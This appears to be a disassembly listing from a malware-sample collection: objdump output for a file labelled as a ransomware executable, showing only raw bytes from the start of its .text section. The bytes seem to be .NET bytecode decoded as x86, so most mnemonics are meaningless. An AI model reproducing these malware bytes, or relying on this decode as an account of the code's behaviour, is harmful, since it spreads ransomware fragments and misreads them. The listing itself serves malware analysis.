
malware_samples/ransomware/c9205c28eabfe49b13e87c10a15850f1b65fb52b3c352fe34e59c5090df7f712.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	70 6b                	jo     0x40206d
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 b8 36 00    	add    %al,0x36b800
  402013:	00 84 34 00 00 01 00 	add    %al,0x10000(%esp,%esi,1)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	02 00                	add    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1a 28                	sbb    (%eax),%ch
  402052:	03 00                	add    (%eax),%eax
  402054:	00 06                	add    %al,(%esi)
  402056:	2a 00                	sub    (%eax),%al
  402058:	03 30                	add    (%eax),%esi
  40205a:	02 00                	add    (%eax),%al
  40205c:	fb                   	sti
  40205d:	00 00                	add    %al,(%eax)
  40205f:	00 00                	add    %al,(%eax)
  402061:	00 00                	add    %al,(%eax)
  402063:	00 28                	add    %ch,(%eax)
  402065:	04 00                	add    $0x0,%al
  402067:	00 06                	add    %al,(%esi)
  402069:	2c 0c                	sub    $0xc,%al
  40206b:	72 01                	jb     0x40206e
  40206d:	00 00                	add    %al,(%eax)
  40206f:	70 28                	jo     0x402099
  402071:	06                   	push   %es
  402072:	00 00                	add    %al,(%eax)
  402074:	0a 26                	or     (%esi),%ah
  402076:	2a 28                	sub    (%eax),%ch
  402078:	06                   	push   %es
  402079:	00 00                	add    %al,(%eax)
  40207b:	06                   	push   %es
  40207c:	2c 27                	sub    $0x27,%al
  40207e:	7e 20                	jle    0x4020a0
  402080:	00 00                	add    %al,(%eax)
  402082:	04 2d                	add    $0x2d,%al
  402084:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402087:	06                   	push   %es
  402088:	23 00                	and    (%eax),%eax
  40208a:	00 06                	add    %al,(%esi)
  40208c:	73 07                	jae    0x402095
  40208e:	00 00                	add    %al,(%eax)
  402090:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  402096:	7e 20                	jle    0x4020b8
  402098:	00 00                	add    %al,(%eax)
  40209a:	04 73                	add    $0x73,%al
  40209c:	08 00                	or     %al,(%eax)
  40209e:	00 0a                	add    %cl,(%edx)
  4020a0:	28 09                	sub    %cl,(%ecx)
  4020a2:	00 00                	add    %al,(%eax)
  4020a4:	0a 28                	or     (%eax),%ch
  4020a6:	18 00                	sbb    %al,(%eax)
  4020a8:	00 06                	add    %al,(%esi)
  4020aa:	2c 01                	sub    $0x1,%al
  4020ac:	2a 28                	sub    (%eax),%ch
  4020ae:	07                   	pop    %es
  4020af:	00 00                	add    %al,(%eax)
  4020b1:	06                   	push   %es
  4020b2:	2c 06                	sub    $0x6,%al
  4020b4:	17                   	pop    %ss
  4020b5:	28 0a                	sub    %cl,(%edx)
  4020b7:	00 00                	add    %al,(%eax)
  4020b9:	0a 7e 0d             	or     0xd(%esi),%bh
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 2c                	add    $0x2c,%al
  4020c0:	05 28 05 00 00       	add    $0x528,%eax
  4020c5:	06                   	push   %es
  4020c6:	7e 12                	jle    0x4020da
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	04 2c                	add    $0x2c,%al
  4020cc:	0c 7e                	or     $0x7e,%al
  4020ce:	0a 00                	or     (%eax),%al
  4020d0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020d3:	15 00 00 06 2b       	adc    $0x2b060000,%eax
  4020d8:	11 7e 09             	adc    %edi,0x9(%esi)
  4020db:	00 00                	add    %al,(%eax)
  4020dd:	04 2c                	add    $0x2c,%al
  4020df:	0a 7e 0a             	or     0xa(%esi),%bh
  4020e2:	00 00                	add    %al,(%eax)
  4020e4:	04 28                	add    $0x28,%al
  4020e6:	14 00                	adc    $0x0,%al
  4020e8:	00 06                	add    %al,(%esi)
  4020ea:	7e 0c                	jle    0x4020f8
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2c                	add    $0x2c,%al
  4020f0:	05 28 19 00 00       	add    $0x1928,%eax
  4020f5:	06                   	push   %es
  4020f6:	7e 12                	jle    0x40210a
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	04 2c                	add    $0x2c,%al
  4020fc:	3c 7e                	cmp    $0x7e,%al
  4020fe:	13 00                	adc    (%eax),%eax
  402100:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402103:	05 28 1c 00 00       	add    $0x1c28,%eax
  402108:	06                   	push   %es
  402109:	7e 14                	jle    0x40211f
  40210b:	00 00                	add    %al,(%eax)
  40210d:	04 2c                	add    $0x2c,%al
  40210f:	05 28 1d 00 00       	add    $0x1d28,%eax
  402114:	06                   	push   %es
  402115:	7e 15                	jle    0x40212c
  402117:	00 00                	add    %al,(%eax)
  402119:	04 2c                	add    $0x2c,%al
  40211b:	05 28 1e 00 00       	add    $0x1e28,%eax
  402120:	06                   	push   %es
  402121:	7e 16                	jle    0x402139
  402123:	00 00                	add    %al,(%eax)
  402125:	04 2c                	add    $0x2c,%al
  402127:	05 28 1f 00 00       	add    $0x1f28,%eax
  40212c:	06                   	push   %es
  40212d:	7e 17                	jle    0x402146
  40212f:	00 00                	add    %al,(%eax)
  402131:	04 2c                	add    $0x2c,%al
  402133:	05 28 20 00 00       	add    $0x2028,%eax
  402138:	06                   	push   %es
  402139:	28 13                	sub    %dl,(%ebx)
  40213b:	00 00                	add    %al,(%eax)
  40213d:	06                   	push   %es
  40213e:	7e 07                	jle    0x402147
  402140:	00 00                	add    %al,(%eax)
  402142:	04 2c                	add    $0x2c,%al
  402144:	0a 7e 08             	or     0x8(%esi),%bh
  402147:	00 00                	add    %al,(%eax)
  402149:	04 28                	add    $0x28,%al
  40214b:	1a 00                	sbb    (%eax),%al
  40214d:	00 06                	add    %al,(%esi)
  40214f:	28 17                	sub    %dl,(%edi)
  402151:	00 00                	add    %al,(%eax)
  402153:	06                   	push   %es
  402154:	7e 0f                	jle    0x402165
  402156:	00 00                	add    %al,(%eax)
  402158:	04 28                	add    $0x28,%al
  40215a:	21 00                	and    %eax,(%eax)
  40215c:	00 06                	add    %al,(%esi)
  40215e:	2a 2e                	sub    (%esi),%ch
  402160:	73 29                	jae    0x40218b
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	28 0b                	sub    %cl,(%ebx)
  402167:	00 00                	add    %al,(%eax)
  402169:	0a 2a                	or     (%edx),%ch
  40216b:	00 1b                	add    %bl,(%ebx)
  40216d:	30 03                	xor    %al,(%ebx)
  40216f:	00 5f 00             	add    %bl,0x0(%edi)
  402172:	00 00                	add    %al,(%eax)
  402174:	01 00                	add    %eax,(%eax)
  402176:	00 11                	add    %dl,(%ecx)
  402178:	18 8d 14 00 00 01    	sbb    %cl,0x1000014(%ebp)
  40217e:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402181:	04 16                	add    $0x16,%al
  402183:	72 25                	jb     0x4021aa
  402185:	00 00                	add    %al,(%eax)
  402187:	70 a2                	jo     0x40212b
  402189:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40218c:	72 3b                	jb     0x4021c9
  40218e:	00 00                	add    %al,(%eax)
  402190:	70 a2                	jo     0x402134
  402192:	11 04 0a             	adc    %eax,(%edx,%ecx,1)
  402195:	06                   	push   %es
  402196:	13 05 16 13 06 2b    	adc    0x2b061316,%eax
  40219c:	2e 11 05 11 06 9a 0b 	adc    %eax,%cs:0xb9a0611
  4021a3:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4021a6:	00 0a                	add    %cl,(%edx)
  4021a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a9:	0d 00 00 0a 6f       	or     $0x6f0a0000,%eax
  4021ae:	0e                   	push   %cs
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4021b4:	07                   	pop    %es
  4021b5:	28 0f                	sub    %cl,(%edi)
  4021b7:	00 00                	add    %al,(%eax)
  4021b9:	0a 2c 04             	or     (%esp,%eax,1),%ch
  4021bc:	17                   	pop    %ss
  4021bd:	0d de 15 de 03       	or     $0x3de15de,%eax
  4021c2:	26 de 00             	fiadds %es:(%eax)
  4021c5:	11 06                	adc    %eax,(%esi)
  4021c7:	17                   	pop    %ss
  4021c8:	58                   	pop    %eax
  4021c9:	13 06                	adc    (%esi),%eax
  4021cb:	11 06                	adc    %eax,(%esi)
  4021cd:	11 05 8e 69 32 ca    	adc    %eax,0xca32698e
  4021d3:	16                   	push   %ss
  4021d4:	2a 09                	sub    (%ecx),%cl
  4021d6:	2a 00                	sub    (%eax),%al
  4021d8:	01 10                	add    %edx,(%eax)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	00 00                	add    %al,(%eax)
  4021de:	2b 00                	sub    (%eax),%eax
  4021e0:	1f                   	pop    %ds
  4021e1:	4a                   	dec    %edx
  4021e2:	00 03                	add    %al,(%ebx)
  4021e4:	01 00                	add    %eax,(%eax)
  4021e6:	00 01                	add    %al,(%ecx)
  4021e8:	13 30                	adc    (%eax),%esi
  4021ea:	02 00                	add    (%eax),%al
  4021ec:	32 00                	xor    (%eax),%al
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	02 00                	add    (%eax),%al
  4021f2:	00 11                	add    %dl,(%ecx)
  4021f4:	28 10                	sub    %dl,(%eax)
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	0a 6f 11             	or     0x11(%edi),%ch
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	0a 28                	or     (%eax),%ch
  4021ff:	12 00                	adc    (%eax),%al
  402201:	00 0a                	add    %cl,(%edx)
  402203:	0a 1f                	or     (%edi),%bl
  402205:	1a 28                	sbb    (%eax),%ch
  402207:	13 00                	adc    (%eax),%eax
  402209:	00 0a                	add    %cl,(%edx)
  40220b:	0b 06                	or     (%esi),%eax
  40220d:	07                   	pop    %es
  40220e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402211:	00 0a                	add    %cl,(%edx)
  402213:	2c 10                	sub    $0x10,%al
  402215:	7e 0e                	jle    0x402225
  402217:	00 00                	add    %al,(%eax)
  402219:	04 20                	add    $0x20,%al
  40221b:	e8 03 00 00 5a       	call   0x5a402223
  402220:	28 15 00 00 0a 2a    	sub    %dl,0x2a0a0000
  402226:	00 00                	add    %al,(%eax)
  402228:	1b 30                	sbb    (%eax),%esi
  40222a:	03 00                	add    (%eax),%eax
  40222c:	53                   	push   %ebx
  40222d:	00 00                	add    %al,(%eax)
  40222f:	00 03                	add    %al,(%ebx)
  402231:	00 00                	add    %al,(%eax)
  402233:	11 7e 16             	adc    %edi,0x16(%esi)
  402236:	00 00                	add    %al,(%eax)
  402238:	0a 72 47             	or     0x47(%edx),%dh
  40223b:	00 00                	add    %al,(%eax)
  40223d:	70 7e                	jo     0x4022bd
  40223f:	0b 00                	or     (%eax),%eax
  402241:	00 04 28             	add    %al,(%eax,%ebp,1)
  402244:	17                   	pop    %ss
  402245:	00 00                	add    %al,(%eax)
  402247:	0a 6f 18             	or     0x18(%edi),%ch
  40224a:	00 00                	add    %al,(%eax)
  40224c:	0a 0a                	or     (%edx),%cl
  40224e:	06                   	push   %es
  40224f:	7e 0b                	jle    0x40225c
  402251:	00 00                	add    %al,(%eax)
  402253:	04 6f                	add    $0x6f,%al
  402255:	19 00                	sbb    %eax,(%eax)
  402257:	00 0a                	add    %cl,(%edx)
  402259:	0b 06                	or     (%esi),%eax
  40225b:	6f                   	outsl  %ds:(%esi),(%dx)
  40225c:	1a 00                	sbb    (%eax),%al
  40225e:	00 0a                	add    %cl,(%edx)
  402260:	07                   	pop    %es
  402261:	6f                   	outsl  %ds:(%esi),(%dx)
  402262:	1b 00                	sbb    (%eax),%eax
  402264:	00 0a                	add    %cl,(%edx)
  402266:	6f                   	outsl  %ds:(%esi),(%dx)
  402267:	1c 00                	sbb    $0x0,%al
  402269:	00 0a                	add    %cl,(%edx)
  40226b:	16                   	push   %ss
  40226c:	31 04 16             	xor    %eax,(%esi,%edx,1)
  40226f:	0c de                	or     $0xde,%al
  402271:	13 17                	adc    (%edi),%edx
  402273:	0c de                	or     $0xde,%al
  402275:	0f 06                	clts
  402277:	2c 06                	sub    $0x6,%al
  402279:	06                   	push   %es
  40227a:	6f                   	outsl  %ds:(%esi),(%dx)
  40227b:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  402280:	26 17                	es pop %ss
  402282:	0c de                	or     $0xde,%al
  402284:	00 08                	add    %cl,(%eax)
  402286:	2a 00                	sub    (%eax),%al
  402288:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40228b:	00 02                	add    %al,(%edx)
  40228d:	00 1a                	add    %bl,(%edx)
  40228f:	00 28                	add    %ch,(%eax)
  402291:	42                   	inc    %edx
  402292:	00 0a                	add    %cl,(%edx)
	...
  40229c:	4c                   	dec    %esp
  40229d:	4c                   	dec    %esp
  40229e:	00 05 01 00 00 01    	add    %al,0x1000001
  4022a4:	1b 30                	sbb    (%eax),%esi
  4022a6:	02 00                	add    (%eax),%al
  4022a8:	65 00 00             	add    %al,%gs:(%eax)
  4022ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4022ae:	00 11                	add    %dl,(%ecx)
  4022b0:	28 1e                	sub    %bl,(%esi)
  4022b2:	00 00                	add    %al,(%eax)
  4022b4:	0a 0a                	or     (%edx),%cl
  4022b6:	28 1f                	sub    %bl,(%edi)
  4022b8:	00 00                	add    %al,(%eax)
  4022ba:	0a 0b                	or     (%ebx),%cl
  4022bc:	06                   	push   %es
  4022bd:	13 04 16             	adc    (%esi,%edx,1),%eax
  4022c0:	13 05 2b 45 11 04    	adc    0x411452b,%eax
  4022c6:	11 05 9a 0c 08 6f    	adc    %eax,0x6f080c9a
  4022cc:	20 00                	and    %al,(%eax)
  4022ce:	00 0a                	add    %cl,(%edx)
  4022d0:	16                   	push   %ss
  4022d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d2:	21 00                	and    %eax,(%eax)
  4022d4:	00 0a                	add    %cl,(%edx)
  4022d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d7:	22 00                	and    (%eax),%al
  4022d9:	00 0a                	add    %cl,(%edx)
  4022db:	28 23                	sub    %ah,(%ebx)
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	0a 6f 11             	or     0x11(%edi),%ch
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	0a 28                	or     (%eax),%ch
  4022e6:	0f 00 00             	sldt   (%eax)
  4022e9:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4022ec:	07                   	pop    %es
  4022ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ee:	24 00                	and    $0x0,%al
  4022f0:	00 0a                	add    %cl,(%edx)
  4022f2:	08 6f 24             	or     %ch,0x24(%edi)
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	0a 2e                	or     (%esi),%ch
  4022f9:	04 17                	add    $0x17,%al
  4022fb:	0d de 15 de 03       	or     $0x3de15de,%eax
  402300:	26 de 00             	fiadds %es:(%eax)
  402303:	11 05 17 58 13 05    	adc    %eax,0x5135817
  402309:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  40230f:	32 b3 16 2a 09 2a    	xor    0x2a092a16(%ebx),%dh
  402315:	00 00                	add    %al,(%eax)
  402317:	00 01                	add    %al,(%ecx)
  402319:	10 00                	adc    %al,(%eax)
  40231b:	00 00                	add    %al,(%eax)
  40231d:	00 1a                	add    %bl,(%edx)
  40231f:	00 36                	add    %dh,(%esi)
  402321:	50                   	push   %eax
  402322:	00 03                	add    %al,(%ebx)
  402324:	20 00                	and    %al,(%eax)
  402326:	00 01                	add    %al,(%ecx)
  402328:	13 30                	adc    (%eax),%esi
  40232a:	04 00                	add    $0x0,%al
  40232c:	41                   	inc    %ecx
  40232d:	00 00                	add    %al,(%eax)
  40232f:	00 05 00 00 11 73    	add    %al,0x73110000
  402335:	25 00 00 0a 0a       	and    $0xa0a0000,%eax
  40233a:	16                   	push   %ss
  40233b:	0b 2b                	or     (%ebx),%ebp
  40233d:	2c 72                	sub    $0x72,%al
  40233f:	5b                   	pop    %ebx
  402340:	00 00                	add    %al,(%eax)
  402342:	70 7e                	jo     0x4023c2
  402344:	1f                   	pop    %ds
  402345:	00 00                	add    %al,(%eax)
  402347:	04 16                	add    $0x16,%al
  402349:	72 5b                	jb     0x4023a6
  40234b:	00 00                	add    %al,(%eax)
  40234d:	70 6f                	jo     0x4023be
  40234f:	1c 00                	sbb    $0x0,%al
  402351:	00 0a                	add    %cl,(%edx)
  402353:	6f                   	outsl  %ds:(%esi),(%dx)
  402354:	26 00 00             	add    %al,%es:(%eax)
  402357:	0a 6f 27             	or     0x27(%edi),%ch
  40235a:	00 00                	add    %al,(%eax)
  40235c:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40235f:	08 6f 28             	or     %ch,0x28(%edi)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 26                	or     (%esi),%ah
  402366:	07                   	pop    %es
  402367:	17                   	pop    %ss
  402368:	58                   	pop    %eax
  402369:	0b 07                	or     (%edi),%eax
  40236b:	02 32                	add    (%edx),%dh
  40236d:	d0 06                	rolb   $1,(%esi)
  40236f:	6f                   	outsl  %ds:(%esi),(%dx)
  402370:	1b 00                	sbb    (%eax),%eax
  402372:	00 0a                	add    %cl,(%edx)
  402374:	2a 00                	sub    (%eax),%al
  402376:	00 00                	add    %al,(%eax)
  402378:	13 30                	adc    (%eax),%esi
  40237a:	04 00                	add    $0x0,%al
  40237c:	58                   	pop    %eax
  40237d:	00 00                	add    %al,(%eax)
  40237f:	00 05 00 00 11 7e    	add    %al,0x7e110000
  402385:	06                   	push   %es
  402386:	00 00                	add    %al,(%eax)
  402388:	04 72                	add    $0x72,%al
  40238a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40238b:	00 00                	add    %al,(%eax)
  40238d:	70 28                	jo     0x4023b7
  40238f:	0f 00 00             	sldt   (%eax)
  402392:	0a 2c 41             	or     (%ecx,%eax,2),%ch
  402395:	73 25                	jae    0x4023bc
  402397:	00 00                	add    %al,(%eax)
  402399:	0a 0a                	or     (%edx),%cl
  40239b:	16                   	push   %ss
  40239c:	0b 2b                	or     (%ebx),%ebp
  40239e:	2c 72                	sub    $0x72,%al
  4023a0:	5b                   	pop    %ebx
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	70 7e                	jo     0x402423
  4023a5:	1f                   	pop    %ds
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	04 16                	add    $0x16,%al
  4023aa:	72 5b                	jb     0x402407
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	70 6f                	jo     0x40241f
  4023b0:	1c 00                	sbb    $0x0,%al
  4023b2:	00 0a                	add    %cl,(%edx)
  4023b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b5:	26 00 00             	add    %al,%es:(%eax)
  4023b8:	0a 6f 27             	or     0x27(%edi),%ch
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4023c0:	08 6f 28             	or     %ch,0x28(%edi)
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 26                	or     (%esi),%ah
  4023c7:	07                   	pop    %es
  4023c8:	17                   	pop    %ss
  4023c9:	58                   	pop    %eax
  4023ca:	0b 07                	or     (%edi),%eax
  4023cc:	02 32                	add    (%edx),%dh
  4023ce:	d0 06                	rolb   $1,(%esi)
  4023d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d1:	1b 00                	sbb    (%eax),%eax
  4023d3:	00 0a                	add    %cl,(%edx)
  4023d5:	2a 7e 06             	sub    0x6(%esi),%bh
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	04 2a                	add    $0x2a,%al
  4023dc:	13 30                	adc    (%eax),%esi
  4023de:	02 00                	add    (%eax),%al
  4023e0:	13 00                	adc    (%eax),%eax
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	06                   	push   %es
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	11 28                	adc    %ebp,(%eax)
  4023e9:	29 00                	sub    %eax,(%eax)
  4023eb:	00 0a                	add    %cl,(%edx)
  4023ed:	02 6f 2a             	add    0x2a(%edi),%ch
  4023f0:	00 00                	add    %al,(%eax)
  4023f2:	0a 0a                	or     (%edx),%cl
  4023f4:	06                   	push   %es
  4023f5:	28 2b                	sub    %ch,(%ebx)
  4023f7:	00 00                	add    %al,(%eax)
  4023f9:	0a 2a                	or     (%edx),%ch
  4023fb:	1e                   	push   %ds
  4023fc:	02 28                	add    (%eax),%ch
  4023fe:	2c 00                	sub    $0x0,%al
  402400:	00 0a                	add    %cl,(%edx)
  402402:	2a 1e                	sub    (%esi),%bl
  402404:	02 28                	add    (%eax),%ch
  402406:	2c 00                	sub    $0x0,%al
  402408:	00 0a                	add    %cl,(%edx)
  40240a:	2a 1e                	sub    (%esi),%bl
  40240c:	02 28                	add    (%eax),%ch
  40240e:	2c 00                	sub    $0x0,%al
  402410:	00 0a                	add    %cl,(%edx)
  402412:	2a 4a 03             	sub    0x3(%edx),%cl
  402415:	02 7b 2b             	add    0x2b(%ebx),%bh
  402418:	00 00                	add    %al,(%eax)
  40241a:	04 6f                	add    $0x6f,%al
  40241c:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  402421:	0f 00 00             	sldt   (%eax)
  402424:	0a 2a                	or     (%edx),%ch
  402426:	00 00                	add    %al,(%eax)
  402428:	1b 30                	sbb    (%eax),%esi
  40242a:	03 00                	add    (%eax),%eax
  40242c:	41                   	inc    %ecx
  40242d:	01 00                	add    %eax,(%eax)
  40242f:	00 07                	add    %al,(%edi)
  402431:	00 00                	add    %al,(%eax)
  402433:	11 73 34             	adc    %esi,0x34(%ebx)
  402436:	00 00                	add    %al,(%eax)
  402438:	06                   	push   %es
  402439:	13 06                	adc    (%esi),%eax
  40243b:	11 06                	adc    %eax,(%esi)
  40243d:	02 7d 29             	add    0x29(%ebp),%bh
  402440:	00 00                	add    %al,(%eax)
  402442:	04 11                	add    $0x11,%al
  402444:	06                   	push   %es
  402445:	02 7b 25             	add    0x25(%ebx),%bh
  402448:	00 00                	add    %al,(%eax)
  40244a:	04 7d                	add    $0x7d,%al
  40244c:	2a 00                	sub    (%eax),%al
  40244e:	00 04 11             	add    %al,(%ecx,%edx,1)
  402451:	06                   	push   %es
  402452:	02 7b 26             	add    0x26(%ebx),%bh
  402455:	00 00                	add    %al,(%eax)
  402457:	04 03                	add    $0x3,%al
  402459:	9a 28 2e 00 00 0a 7d 	lcall  $0x7d0a,$0x2e28
  402460:	2b 00                	sub    (%eax),%eax
  402462:	00 04 02             	add    %al,(%edx,%eax,1)
  402465:	7b 26                	jnp    0x40248d
  402467:	00 00                	add    %al,(%eax)
  402469:	04 03                	add    $0x3,%al
  40246b:	9a 28 2f 00 00 0a 0a 	lcall  $0xa0a,$0x2f28
  402472:	7e 1e                	jle    0x402492
  402474:	00 00                	add    %al,(%eax)
  402476:	04 11                	add    $0x11,%al
  402478:	06                   	push   %es
  402479:	fe 06                	incb   (%esi)
  40247b:	35 00 00 06 73       	xor    $0x73060000,%eax
  402480:	30 00                	xor    %al,(%eax)
  402482:	00 0a                	add    %cl,(%edx)
  402484:	28 01                	sub    %al,(%ecx)
  402486:	00 00                	add    %al,(%eax)
  402488:	2b 39                	sub    (%ecx),%edi
  40248a:	e1 00                	loope  0x40248c
  40248c:	00 00                	add    %al,(%eax)
  40248e:	06                   	push   %es
  40248f:	7e 11                	jle    0x4024a2
  402491:	00 00                	add    %al,(%eax)
  402493:	04 28                	add    $0x28,%al
  402495:	14 00                	adc    $0x0,%al
  402497:	00 0a                	add    %cl,(%edx)
  402499:	39 d1                	cmp    %edx,%ecx
  40249b:	00 00                	add    %al,(%eax)
  40249d:	00 02                	add    %al,(%edx)
  40249f:	7b 26                	jnp    0x4024c7
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	04 03                	add    $0x3,%al
  4024a5:	9a 73 32 00 00 0a 0b 	lcall  $0xb0a,$0x3273
  4024ac:	07                   	pop    %es
  4024ad:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4024b3:	33 00                	xor    (%eax),%eax
  4024b5:	00 0a                	add    %cl,(%edx)
  4024b7:	de 03                	fiadds (%ebx)
  4024b9:	26 de 00             	fiadds %es:(%eax)
  4024bc:	1f                   	pop    %ds
  4024bd:	28 28                	sub    %ch,(%eax)
  4024bf:	0e                   	push   %cs
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	06                   	push   %es
  4024c3:	0c 07                	or     $0x7,%al
  4024c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c6:	34 00                	xor    $0x0,%al
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	20 00                	and    %al,(%eax)
  4024cc:	a2 2f 8d 6e 2f       	mov    %al,0x2f6e8d2f
  4024d1:	2c 02                	sub    $0x2,%al
  4024d3:	7b 26                	jnp    0x4024fb
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	04 03                	add    $0x3,%al
  4024d9:	9a 28 0c 00 00 06 2c 	lcall  $0x2c06,$0xc28
  4024e0:	31 08                	xor    %ecx,(%eax)
  4024e2:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  4024e8:	12 00                	adc    (%eax),%al
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	0d 02 7b 26 00       	or     $0x267b02,%eax
  4024f1:	00 04 03             	add    %al,(%ebx,%eax,1)
  4024f4:	9a 08 09 28 0f 00 00 	lcall  $0x0,$0xf280908
  4024fb:	06                   	push   %es
  4024fc:	2b 14 02             	sub    (%edx,%eax,1),%edx
  4024ff:	7b 26                	jnp    0x402527
  402501:	00 00                	add    %al,(%eax)
  402503:	04 03                	add    $0x3,%al
  402505:	9a 08 07 6f 34 00 00 	lcall  $0x0,$0x346f0708
  40250c:	0a 28                	or     (%eax),%ch
  40250e:	10 00                	adc    %al,(%eax)
  402510:	00 06                	add    %al,(%esi)
  402512:	02 7b 27             	add    0x27(%ebx),%bh
  402515:	00 00                	add    %al,(%eax)
  402517:	04 2c                	add    $0x2c,%al
  402519:	55                   	push   %ebp
  40251a:	02 16                	add    (%esi),%dl
  40251c:	7d 27                	jge    0x402545
  40251e:	00 00                	add    %al,(%eax)
  402520:	04 02                	add    $0x2,%al
  402522:	7b 25                	jnp    0x402549
  402524:	00 00                	add    %al,(%eax)
  402526:	04 7b                	add    $0x7b,%al
  402528:	24 00                	and    $0x0,%al
  40252a:	00 04 72             	add    %al,(%edx,%esi,2)
  40252d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40252e:	00 00                	add    %al,(%eax)
  402530:	70 7e                	jo     0x4025b0
  402532:	11 00                	adc    %eax,(%eax)
  402534:	00 04 28             	add    %al,(%eax,%ebp,1)
  402537:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  40253c:	04 1f                	add    $0x1f,%al
  40253e:	19 28                	sbb    %ebp,(%eax)
  402540:	13 00                	adc    (%eax),%eax
  402542:	00 0a                	add    %cl,(%edx)
  402544:	13 05 11 04 28 36    	adc    0x36280411,%eax
  40254a:	00 00                	add    %al,(%eax)
  40254c:	0a 2d 20 02 7b 25    	or     0x257b0220,%ch
  402552:	00 00                	add    %al,(%eax)
  402554:	04 7b                	add    $0x7b,%al
  402556:	24 00                	and    $0x0,%al
  402558:	00 04 11             	add    %al,(%ecx,%edx,1)
  40255b:	05 28 14 00 00       	add    $0x1428,%eax
  402560:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402563:	11 04 7e             	adc    %eax,(%esi,%edi,2)
  402566:	1d 00 00 04 28       	sbb    $0x28040000,%eax
  40256b:	37                   	aaa
  40256c:	00 00                	add    %al,(%eax)
  40256e:	0a de                	or     %dh,%bl
  402570:	03 26                	add    (%esi),%esp
  402572:	de 00                	fiadds (%eax)
  402574:	2a 00                	sub    (%eax),%al
  402576:	00 00                	add    %al,(%eax)
  402578:	41                   	inc    %ecx
  402579:	34 00                	xor    $0x0,%al
  40257b:	00 00                	add    %al,(%eax)
  40257d:	00 00                	add    %al,(%eax)
  40257f:	00 78 00             	add    %bh,0x0(%eax)
  402582:	00 00                	add    %al,(%eax)
  402584:	0d 00 00 00 85       	or     $0x85000000,%eax
  402589:	00 00                	add    %al,(%eax)
  40258b:	00 03                	add    %al,(%ebx)
  40258d:	00 00                	add    %al,(%eax)
  40258f:	00 01                	add    %al,(%ecx)
  402591:	00 00                	add    %al,(%eax)
  402593:	01 00                	add    %eax,(%eax)
  402595:	00 00                	add    %al,(%eax)
  402597:	00 00                	add    %al,(%eax)
  402599:	00 00                	add    %al,(%eax)
  40259b:	00 3d 01 00 00 3d    	add    %bh,0x3d000001
  4025a1:	01 00                	add    %eax,(%eax)
  4025a3:	00 03                	add    %al,(%ebx)
  4025a5:	00 00                	add    %al,(%eax)
  4025a7:	00 20                	add    %ah,(%eax)
  4025a9:	00 00                	add    %al,(%eax)
  4025ab:	01 1b                	add    %ebx,(%ebx)
  4025ad:	30 03                	xor    %al,(%ebx)
  4025af:	00 33                	add    %dh,(%ebx)
  4025b1:	00 00                	add    %al,(%eax)
  4025b3:	00 08                	add    %cl,(%eax)
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	11 02                	adc    %eax,(%edx)
  4025b9:	7b 28                	jnp    0x4025e3
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	04 03                	add    $0x3,%al
